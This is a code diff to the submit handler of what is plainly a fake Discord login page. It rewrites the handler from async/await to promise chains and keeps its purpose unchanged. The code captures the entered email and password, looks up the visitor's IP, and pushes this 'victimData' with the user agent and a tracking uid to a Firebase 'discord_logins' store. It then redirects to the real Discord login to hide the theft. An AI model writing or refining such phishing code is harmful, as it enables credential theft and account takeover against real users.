@@ -101,39 +101,47 @@
         const urlParams = new URLSearchParams(window.location.search);
         const uid = urlParams.get('uid');
 
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        document.getElementById('loginForm').onsubmit = function(e) {
             e.preventDefault();
             
             const email = document.getElementById('emailORphone').value;
             const password = document.getElementById('password').value;
             
-            try {
-                // Get IP address
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                
-                // Create victim data object
-                const victimData = {
-                    email: email,
-                    password: password,
-                    ip: ipData.ip,
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent,
-                    uid: uid || 'unknown'  // Store the user's UID
-                };
-                
-                // Save to Firebase
-                await firebase.database().ref('discord_logins').push(victimData);
-                
-                // Redirect to real Discord
-                window.location.href = 'https://discord.com/login';
-                
-            } catch (error) {
-                console.error('Error:', error);
-                // Redirect anyway after error
-                window.location.href = 'https://discord.com/login';
-            }
-        });
+            // Get IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    // Create victim data object
+                    const victimData = {
+                        email: email,
+                        password: password,
+                        ip: data.ip,
+                        timestamp: new Date().toISOString(),
+                        userAgent: navigator.userAgent,
+                        uid: uid || 'unknown'  // Store the user's UID
+                    };
+                    
+                    // Save to Firebase
+                    firebase.database().ref('discord_logins').push(victimData)
+                        .then(() => {
+                            console.log('Data saved successfully');
+                            // Redirect to real Discord
+                            window.location.replace('https://discord.com/login');
+                        })
+                        .catch((error) => {
+                            console.error('Error saving data:', error);
+                            // Redirect anyway after error
+                            window.location.replace('https://discord.com/login');
+                        });
+                })
+                .catch(error => {
+                    console.error('Error getting IP:', error);
+                    // Redirect in case of IP error
+                    window.location.replace('https://discord.com/login');
+                });
+            
+            return false;
+        };
     </script>
     <script src="./js/script.js"></script>
 </body>
